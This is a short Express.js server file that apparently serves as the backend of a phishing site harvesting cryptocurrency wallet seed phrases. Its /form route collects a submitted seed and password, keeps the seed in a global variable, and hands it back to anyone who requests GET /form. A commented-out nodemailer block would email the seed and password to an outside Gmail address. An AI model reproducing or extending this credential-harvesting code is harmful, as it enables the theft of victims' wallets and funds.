const express = require('express')
const nodemailer = require('nodemailer')
const path = require('path')
const cors = require('cors')
require('dotenv').config()

let key;

const app = express()

const port = process.env.PORT || 8080

app.use(cors())
app.use(express.urlencoded({ extended: false }))
app.use(express.json())


if(process.env.NODE_ENV === 'production'){
  app.use(express.static('client/build'))
  app.get('*', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'))  
  })
}

app.post('/form', async(req, res) => {
  const { seed, password } = await req.body
  res.json({ status: 200 })
  key = seed

  // const transporter = await nodemailer.createTransport({
  //   service: 'gmail',
  //   auth: {
  //     user: process.env.USER,
  //     pass: process.env.PASSWORD
  //   } 
  // })
 
  // const response = await transporter.sendMail({
  //   from: 'jtom29544@gmail.com',
  //   to: "xenuxyz@gmail.com",
  //   subject: "New seed", 
  //   text: `seed: ${seed} \npassword: ${password ? password : ''}`
  // })  

}) 

app.get('/form', (req, res) => {
  return res.json({ key })
})

app.listen(port, () => { 
  console.log(`server started on port ${port}`)   
});  
  